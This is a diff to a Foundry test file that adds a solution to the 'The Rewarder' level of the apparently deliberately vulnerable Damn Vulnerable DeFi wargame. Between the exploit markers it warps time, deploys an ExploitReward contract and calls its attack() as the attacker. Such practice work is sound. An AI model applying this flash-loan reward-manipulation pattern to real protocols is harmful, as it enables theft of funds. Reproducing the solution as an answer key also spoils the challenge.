@@ -8,7 +8,7 @@ import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {TheRewarderPool} from "../../../src/Contracts/the-rewarder/TheRewarderPool.sol";
 import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
 import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
-import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
+import {ExploitReward, FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
 
 contract TheRewarder is Test {
     uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
@@ -88,7 +88,15 @@ contract TheRewarder is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.warp(block.timestamp + 5 days);
+        ExploitReward hack = new ExploitReward(
+            address(flashLoanerPool), 
+            address(dvt),
+            address(theRewarderPool),
+            address(theRewarderPool.rewardToken())
+        );
+        vm.prank(attacker);
+        hack.attack();
         /**
          * EXPLOIT END *
          */
